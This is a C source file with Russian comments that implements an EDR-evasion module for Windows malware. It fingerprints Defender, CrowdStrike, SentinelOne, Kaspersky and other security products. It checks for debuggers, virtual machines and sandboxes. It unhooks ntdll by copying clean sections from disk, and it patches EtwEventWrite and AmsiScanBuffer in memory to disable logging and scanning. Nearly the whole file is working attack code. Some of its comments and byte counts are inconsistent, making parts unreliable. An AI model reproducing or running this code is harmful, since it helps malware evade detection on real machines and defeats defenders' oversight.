/**
 * @file edr_evasion.c
 * @brief Реализация модуля обхода EDR (Endpoint Detection and Response)
 * 
 * Данный модуль предоставляет функции для обнаружения и обхода
 * современных решений по защите конечных точек (EDR)
 */

#include "edr_evasion.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>

// Статические структуры и типы для внутреннего использования
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

// Глобальные переменные для хранения состояния модуля
static EDR_EVASION_CONFIG g_config = {0};
static BOOL g_initialized = FALSE;
static PVOID g_ntdll_original_data = NULL;
static SIZE_T g_ntdll_original_size = 0;
static PVOID g_etw_original_bytes = NULL;
static PVOID g_amsi_original_bytes = NULL;

// Определения сигнатур для поиска EDR процессов, драйверов и служб
static const struct {
    EDR_TYPE type;
    const char *name;
    const char *process_patterns[10];
    const char *driver_patterns[10];
    const char *service_patterns[10];
} EDR_SIGNATURES[] = {
    {
        EDR_TYPE_WINDOWS_DEFENDER,
        "Windows Defender",
        {"MsMpEng.exe", "NisSrv.exe", "MpCmdRun.exe", "SecurityHealthService.exe", NULL},
        {"WdFilter.sys", "WdBoot.sys", "WdNisDrv.sys", NULL},
        {"WinDefend", "Sense", "WdNisSvc", NULL}
    },
    {
        EDR_TYPE_CROWDSTRIKE,
        "CrowdStrike Falcon",
        {"csfalcon", "csagent", "csservice", NULL},
        {"CrowdStrike", "CSAgent", "CSFalcon", NULL},
        {"CSFalconService", "CSAgent", NULL}
    },
    {
        EDR_TYPE_CARBON_BLACK,
        "Carbon Black",
        {"RepMgr.exe", "CbDefense", "CbOsrSvc", NULL},
        {"CbDefense", "CbEdr", "Cb.sys", NULL},
        {"carbonblack", "CBDefense", "CbDefenseSvc", NULL}
    },
    {
        EDR_TYPE_SENTINEL_ONE,
        "SentinelOne",
        {"SentinelAgent.exe", "SentinelServiceHost.exe", "SentinelUI.exe", NULL},
        {"SentinelMonitor.sys", NULL},
        {"SentinelAgent", "SentinelOne", NULL}
    },
    {
        EDR_TYPE_SYMANTEC,
        "Symantec",
        {"ccSvcHst.exe", "smcgui.exe", "rtvscan.exe", NULL},
        {"symefa", "symefasi", "symevnt", NULL},
        {"Symantec", "Norton", "sepmsvc", NULL}
    },
    {
        EDR_TYPE_MCAFEE,
        "McAfee",
        {"mcshield.exe", "mcscan.exe", "mfemms.exe", NULL},
        {"mfehidk", "mfefirek", "mfeavfk", NULL},
        {"mcafee", "mfewc", "mfemms", NULL}
    },
    {
        EDR_TYPE_ESET,
        "ESET",
        {"ekrn.exe", "egui.exe", "eguiProxy.exe", NULL},
        {"eamonm", "ehdrv", "epfw", NULL},
        {"ekrn", "eset", NULL}
    },
    {
        EDR_TYPE_KASPERSKY,
        "Kaspersky",
        {"avp.exe", "kavtray.exe", "klnagent.exe", NULL},
        {"klmd", "klflt", "klif", NULL},
        {"AVP", "Kaspersky", "klnagent", NULL}
    },
    {0, NULL, {NULL}, {NULL}, {NULL}} // Окончание массива
};

// Вспомогательные функции
static BOOL IsProcessRunning(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    BOOL found = FALSE;
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            char currentName[MAX_PATH] = {0};
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, 
                               currentName, MAX_PATH, NULL, NULL);
            if (_stricmp(currentName, processName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return found;
}

static BOOL IsDriverLoaded(const char *driverName) {
    DWORD cbNeeded = 0;
    LPVOID drivers[1024] = {0};
    
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        return FALSE;
    }

    BOOL found = FALSE;
    char driverPath[MAX_PATH] = {0};
    DWORD driverCount = cbNeeded / sizeof(drivers[0]);

    for (DWORD i = 0; i < driverCount; i++) {
        if (GetDeviceDriverBaseNameA(drivers[i], driverPath, sizeof(driverPath))) {
            if (strstr(driverPath, driverName) != NULL) {
                found = TRUE;
                break;
            }
        }
    }

    return found;
}

static BOOL IsServiceInstalled(const char *serviceName) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager == NULL) {
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceA(hSCManager, serviceName, SERVICE_QUERY_STATUS);
    BOOL installed = (hService != NULL);
    
    if (hService) {
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    
    return installed;
}

static BOOL FindPatternInMemory(PBYTE baseAddress, SIZE_T size, PBYTE pattern, SIZE_T patternSize, PBYTE *foundAddress) {
    for (SIZE_T i = 0; i <= size - patternSize; i++) {
        BOOL found = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) {
            if (pattern[j] != 0x00 && baseAddress[i + j] != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            *foundAddress = baseAddress + i;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL SetMemoryProtection(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect) {
    return VirtualProtect(address, size, newProtect, oldProtect);
}

static HMODULE GetModuleHandleSafe(LPCSTR moduleName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(moduleName);
    }
    return hModule;
}

// Реализация функций модуля
BOOL EDREvade_Initialize(const EDR_EVASION_CONFIG* config) {
    if (config == NULL) {
        return FALSE;
    }

    if (g_initialized) {
        EDREvade_Cleanup();
    }

    memcpy(&g_config, config, sizeof(EDR_EVASION_CONFIG));
    g_initialized = TRUE;

    return TRUE;
}

BOOL EDREvade_DetectEDR(EDR_EVASION_RESULT* result) {
    if (!g_initialized || result == NULL) {
        return FALSE;
    }

    memset(result, 0, sizeof(EDR_EVASION_RESULT));
    
    for (int i = 0; EDR_SIGNATURES[i].name != NULL; i++) {
        BOOL detected = FALSE;
        EDR_INFO *info = &result->detected_edr[result->detected_edr_count];
        
        // Проверка процессов
        for (int j = 0; EDR_SIGNATURES[i].process_patterns[j] != NULL; j++) {
            if (IsProcessRunning(EDR_SIGNATURES[i].process_patterns[j])) {
                detected = TRUE;
                strncpy(info->process_names[j], EDR_SIGNATURES[i].process_patterns[j], sizeof(info->process_names[j]) - 1);
            }
        }
        
        // Проверка драйверов
        for (int j = 0; EDR_SIGNATURES[i].driver_patterns[j] != NULL; j++) {
            if (IsDriverLoaded(EDR_SIGNATURES[i].driver_patterns[j])) {
                detected = TRUE;
                strncpy(info->driver_names[j], EDR_SIGNATURES[i].driver_patterns[j], sizeof(info->driver_names[j]) - 1);
            }
        }
        
        // Проверка служб
        for (int j = 0; EDR_SIGNATURES[i].service_patterns[j] != NULL; j++) {
            if (IsServiceInstalled(EDR_SIGNATURES[i].service_patterns[j])) {
                detected = TRUE;
                strncpy(info->service_names[j], EDR_SIGNATURES[i].service_patterns[j], sizeof(info->service_names[j]) - 1);
            }
        }
        
        if (detected) {
            info->type = EDR_SIGNATURES[i].type;
            strncpy(info->name, EDR_SIGNATURES[i].name, sizeof(info->name) - 1);
            info->is_active = TRUE;
            result->detected_edr_count++;
        }
    }
    
    return TRUE;
}

BOOL EDREvade_ApplyEvasionTechniques(EDR_EVASION_RESULT* result) {
    if (!g_initialized || result == NULL) {
        return FALSE;
    }
    
    BOOL success = TRUE;
    result->applied_techniques = g_config.techniques_mask;
    
    // Применение выбранных техник обхода
    if (g_config.techniques_mask & EVASION_UNHOOK_NTDLL) {
        if (EDREvade_UnhookNtdll()) {
            result->successful_techniques |= EVASION_UNHOOK_NTDLL;
        } else {
            result->failed_techniques |= EVASION_UNHOOK_NTDLL;
            success = FALSE;
        }
    }
    
    if (g_config.techniques_mask & EVASION_PATCH_ETW) {
        if (EDREvade_DisableETW()) {
            result->successful_techniques |= EVASION_PATCH_ETW;
        } else {
            result->failed_techniques |= EVASION_PATCH_ETW;
            success = FALSE;
        }
    }
    
    if (g_config.techniques_mask & EVASION_PATCH_AMSI) {
        if (EDREvade_DisableAMSI()) {
            result->successful_techniques |= EVASION_PATCH_AMSI;
        } else {
            result->failed_techniques |= EVASION_PATCH_AMSI;
            success = FALSE;
        }
    }
    
    return success;
}

BOOL EDREvade_DetectExecutionContext(BOOL* is_debugger, BOOL* is_vm, BOOL* is_sandbox) {
    if (is_debugger == NULL || is_vm == NULL || is_sandbox == NULL) {
        return FALSE;
    }
    
    // Проверка наличия отладчика
    *is_debugger = IsDebuggerPresent();
    
    // Базовое определение виртуальной машины (проверка наличия характерных процессов)
    *is_vm = FALSE;
    if (IsProcessRunning("vmtoolsd.exe") || IsProcessRunning("VBoxService.exe") || 
        IsProcessRunning("vmware.exe") || IsDriverLoaded("vmhgfs")) {
        *is_vm = TRUE;
    }
    
    // Базовое определение песочницы (проверка общего объема ОЗУ)
    *is_sandbox = FALSE;
    MEMORYSTATUSEX memInfo = {0};
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        // Если менее 2 ГБ ОЗУ, возможно это песочница
        if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
            *is_sandbox = TRUE;
        }
    }
    
    return TRUE;
}

BOOL EDREvade_UnhookNtdll(void) {
    HMODULE hNtdll = GetModuleHandleSafe("ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }
    
    // Загрузка чистой копии ntdll.dll из диска
    char ntdllPath[MAX_PATH] = {0};
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat_s(ntdllPath, MAX_PATH, "\\ntdll.dll");
    
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hFileMapping == NULL) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    LPVOID mappedFile = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (mappedFile == NULL) {
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Получение PE заголовков и секций
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    
    PIMAGE_DOS_HEADER cleanDosHeader = (PIMAGE_DOS_HEADER)mappedFile;
    PIMAGE_NT_HEADERS cleanNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)mappedFile + cleanDosHeader->e_lfanew);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER cleanSection = IMAGE_FIRST_SECTION(cleanNtHeaders);
    
    BOOL success = TRUE;
    
    // Копирование секций .text и .data из чистой копии
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section->Name, ".text") == 0 || 
            strcmp((char*)section->Name, ".data") == 0) {
            
            DWORD oldProtect;
            if (SetMemoryProtection((LPVOID)((BYTE*)hNtdll + section->VirtualAddress), 
                                   section->Misc.VirtualSize, 
                                   PAGE_EXECUTE_READWRITE, 
                                   &oldProtect)) {
                
                memcpy((BYTE*)hNtdll + section->VirtualAddress, 
                       (BYTE*)mappedFile + cleanSection->VirtualAddress, 
                       section->Misc.VirtualSize);
                
                SetMemoryProtection((LPVOID)((BYTE*)hNtdll + section->VirtualAddress), 
                                   section->Misc.VirtualSize, 
                                   oldProtect, 
                                   &oldProtect);
            } else {
                success = FALSE;
            }
        }
        
        section++;
        cleanSection++;
    }
    
    UnmapViewOfFile(mappedFile);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
    
    return success;
}

BOOL EDREvade_DisableETW(void) {
    HMODULE hNtdll = GetModuleHandleSafe("ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }
    
    // Поиск функции EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite == NULL) {
        return FALSE;
    }
    
    // Сохранение оригинальных байтов
    if (g_etw_original_bytes == NULL) {
        g_etw_original_bytes = malloc(2);
        if (g_etw_original_bytes == NULL) {
            return FALSE;
        }
        memcpy(g_etw_original_bytes, pEtwEventWrite, 2);
    }
    
    // Патч для возврата STATUS_SUCCESS (xor eax, eax; ret)
    BYTE patch[] = {0x33, 0xC0, 0xC3};
    
    DWORD oldProtect;
    if (SetMemoryProtection(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        SetMemoryProtection(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        return TRUE;
    }
    
    return FALSE;
}

BOOL EDREvade_DisableAMSI(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        return FALSE;
    }
    
    // Поиск функции AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer == NULL) {
        return FALSE;
    }
    
    // Сохранение оригинальных байтов
    if (g_amsi_original_bytes == NULL) {
        g_amsi_original_bytes = malloc(6);
        if (g_amsi_original_bytes == NULL) {
            return FALSE;
        }
        memcpy(g_amsi_original_bytes, pAmsiScanBuffer, 6);
    }
    
    // Патч для возврата AMSI_RESULT_CLEAN
    BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // mov eax, 80070057h; ret
    
    DWORD oldProtect;
    if (SetMemoryProtection(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        SetMemoryProtection(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        return TRUE;
    }
    
    return FALSE;
}

BOOL EDREvade_Cleanup(void) {
    if (!g_initialized) {
        return FALSE;
    }
    
    // Восстановление оригинальных байтов
    if (g_config.restore_hooks_on_exit) {
        // Восстановление оригинальных байтов ETW
        if (g_etw_original_bytes != NULL) {
            HMODULE hNtdll = GetModuleHandleSafe("ntdll.dll");
            if (hNtdll != NULL) {
                FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                if (pEtwEventWrite != NULL) {
                    DWORD oldProtect;
                    if (SetMemoryProtection(pEtwEventWrite, 2, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                        memcpy(pEtwEventWrite, g_etw_original_bytes, 2);
                        SetMemoryProtection(pEtwEventWrite, 2, oldProtect, &oldProtect);
                    }
                }
            }
            free(g_etw_original_bytes);
            g_etw_original_bytes = NULL;
        }
        
        // Восстановление оригинальных байтов AMSI
        if (g_amsi_original_bytes != NULL) {
            HMODULE hAmsi = GetModuleHandleSafe("amsi.dll");
            if (hAmsi != NULL) {
                FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                if (pAmsiScanBuffer != NULL) {
                    DWORD oldProtect;
                    if (SetMemoryProtection(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                        memcpy(pAmsiScanBuffer, g_amsi_original_bytes, 6);
                        SetMemoryProtection(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
                    }
                }
            }
            free(g_amsi_original_bytes);
            g_amsi_original_bytes = NULL;
        }
    }
    
    // Очистка ресурсов
    if (g_ntdll_original_data != NULL) {
        free(g_ntdll_original_data);
        g_ntdll_original_data = NULL;
    }
    
    g_initialized = FALSE;
    memset(&g_config, 0, sizeof(g_config));
    
    return TRUE;
} 